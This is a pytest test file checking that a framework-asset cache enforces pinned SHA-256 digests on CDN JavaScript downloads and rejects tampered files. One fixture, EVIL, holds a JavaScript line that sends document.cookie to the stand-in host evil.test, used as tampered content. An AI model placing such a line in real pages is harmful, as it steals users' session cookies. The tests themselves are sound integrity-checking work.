import hashlib
import io
import logging
from pathlib import Path

import pytest
import yaml
from pydantic import ValidationError

import wra.browser.framework_cache as framework_cache
from wra.browser.framework_cache import (
    FrameworkIntegrityError,
    cached_path_for_url,
    download_framework_asset,
    ensure_cached_path_for_url,
    iter_framework_urls,
)
from wra.core.models import Framework, FrameworkConfig

ROOT = Path(__file__).resolve().parent.parent
URL = "https://cdn.example.test/lib@1.0.0/lib.min.js"
GOOD = b"console.log('lib');"
EVIL = b"fetch('https://evil.test/'+document.cookie);"
GOOD_SHA = hashlib.sha256(GOOD).hexdigest()


class _Response(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _serve(monkeypatch: pytest.MonkeyPatch, payload: bytes) -> list[str]:
    calls: list[str] = []

    def fake_urlopen(url, timeout=None):
        calls.append(url)
        return _Response(payload)

    monkeypatch.setattr(framework_cache, "urlopen", fake_urlopen)
    return calls


def test_a_download_matching_the_pinned_sha256_is_cached(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _serve(monkeypatch, GOOD)

    path = ensure_cached_path_for_url(URL, ".js", tmp_path, sha256=GOOD_SHA)

    assert path.read_bytes() == GOOD
    assert not list(tmp_path.glob("*.part"))


def test_a_download_that_mismatches_the_pinned_sha256_is_rejected_and_not_cached(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _serve(monkeypatch, EVIL)

    with pytest.raises(FrameworkIntegrityError, match="sha256 mismatch"):
        ensure_cached_path_for_url(URL, ".js", tmp_path, sha256=GOOD_SHA)

    assert list(tmp_path.iterdir()) == []


def test_download_framework_asset_leaves_nothing_behind_on_a_mismatch(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _serve(monkeypatch, EVIL)
    dest = tmp_path / "asset.js"

    with pytest.raises(FrameworkIntegrityError):
        download_framework_asset(URL, dest, sha256=GOOD_SHA)

    assert list(tmp_path.iterdir()) == []


def test_a_tampered_cache_file_is_discarded_and_redownloaded_verified(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    cached = cached_path_for_url(URL, ".js", tmp_path)
    cached.write_bytes(EVIL)
    calls = _serve(monkeypatch, GOOD)

    path = ensure_cached_path_for_url(URL, ".js", tmp_path, sha256=GOOD_SHA)

    assert path == cached
    assert path.read_bytes() == GOOD
    assert calls == [URL]


def test_a_tampered_cache_file_is_not_trusted_when_the_cdn_also_serves_other_bytes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    cached = cached_path_for_url(URL, ".js", tmp_path)
    cached.write_bytes(EVIL)
    _serve(monkeypatch, EVIL)

    with pytest.raises(FrameworkIntegrityError):
        ensure_cached_path_for_url(URL, ".js", tmp_path, sha256=GOOD_SHA)

    assert not cached.exists()


def test_an_intact_cache_file_is_served_without_a_download(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    cached = cached_path_for_url(URL, ".js", tmp_path)
    cached.write_bytes(GOOD)
    calls = _serve(monkeypatch, EVIL)

    assert ensure_cached_path_for_url(URL, ".js", tmp_path, sha256=GOOD_SHA.upper()) == cached
    assert calls == []


def test_an_entry_without_sha256_still_downloads_and_warns(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture) -> None:
    _serve(monkeypatch, GOOD)

    with caplog.at_level(logging.WARNING, logger=framework_cache.logger.name):
        path = ensure_cached_path_for_url(URL, ".js", tmp_path)

    assert path.read_bytes() == GOOD
    assert [record.message for record in caplog.records if URL in record.message and "sha256" in record.message]


def test_the_catalog_sha256_is_verified_for_callers_that_only_pass_the_url(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    frameworks = FrameworkConfig(js=[Framework(name="Lib", cdn=URL, tag="script", sha256=GOOD_SHA)])
    iter_framework_urls(frameworks)
    _serve(monkeypatch, EVIL)

    with pytest.raises(FrameworkIntegrityError):
        ensure_cached_path_for_url(URL, ".js", tmp_path)

    assert list(tmp_path.iterdir()) == []


def test_a_malformed_sha256_in_the_catalog_is_rejected() -> None:
    with pytest.raises(ValidationError):
        Framework(name="Lib", cdn=URL, sha256="not-a-digest")


def test_the_shipped_catalog_pins_exact_versions_and_a_sha256_for_every_asset() -> None:
    data = yaml.safe_load((ROOT / "config" / "frameworks.yaml").read_text(encoding="utf-8"))
    frameworks = FrameworkConfig.model_validate(data["frameworks"])

    for framework in [*frameworks.css, *frameworks.js]:
        assert framework.sha256, framework.name
        assert "@latest" not in framework.cdn
    assert frameworks.find_css("Bootstrap").companion_sha256
    assert frameworks.find_js("GSAP").companion_sha256
    assert len(iter_framework_urls(frameworks)) == len(frameworks.css) + len(frameworks.js) + 2
